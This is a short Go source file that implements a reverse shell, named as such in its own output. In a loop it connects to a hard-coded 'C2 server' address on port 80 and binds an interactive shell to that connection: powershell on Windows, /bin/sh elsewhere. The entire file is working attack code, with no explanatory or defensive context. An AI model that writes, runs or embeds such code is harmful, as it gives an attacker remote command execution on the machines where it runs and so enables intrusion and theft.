package main

import (
	"fmt"
	"time"
	"net"
	"runtime"
	"os/exec"
)

func main() {
	fmt.Println("Simple Go Reverse Shell")
	for {
		time.Sleep(3 * time.Second)
		sendShell()
	}
}

// sendShell sends to remote server
func sendShell() {
	// connect to C2 server
	con, err := net.Dial("tcp", "192.168.159.130:80")
	if err != nil {
		return
	}

	// spawn shell for correct OS
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell")
	} else {
		cmd = exec.Command("/bin/sh", "-i")
	}
	// send shell standard in/out/err to C2 server
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con
	cmd.Run()
}
